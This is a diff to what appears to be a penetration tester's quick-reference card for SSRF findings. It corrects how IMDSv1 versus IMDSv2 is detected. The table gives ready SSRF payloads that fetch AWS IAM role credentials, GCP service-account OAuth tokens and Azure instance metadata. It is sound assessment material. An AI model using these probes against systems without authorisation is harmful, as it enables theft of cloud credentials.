@@ -11,7 +11,7 @@ Quick-lookup card. Mechanics in `chapters/`; mindset in `SKILL.md`; terms in `gl
 | Finding | First probe | Confirms |
 |---|---|---|
 | SSRF→AWS IMDS | `?url=http://169.254.169.254/latest/meta-data/` | 200 body; then `/iam/security-credentials/` role name |
-| IMDSv2 check | SSRF `PUT /latest/api/token` (TTL header) | token returned → v1 likely enforced… v2 blocked = report anyway |
+| IMDSv1/v2 check | SSRF: plain `GET /latest/meta-data/` | 200 → IMDSv1 enabled (reportable). Fails but `PUT /latest/api/token` + header works → v2 enforced (good posture; note in report). A v2 token being issuable does *not* prove v1 is off — always try the token-less GET |
 | No-role check | `…/meta-data/iam/` | 404 = no role; empty 200 = revoked |
 | GCP metadata | `?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` w/ `Metadata-Flavor: Google` | OAuth token JSON |
 | Azure MSI | `?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01` w/ `Metadata: true` | instance JSON; `$IDENTITY_ENDPOINT` on App Service |
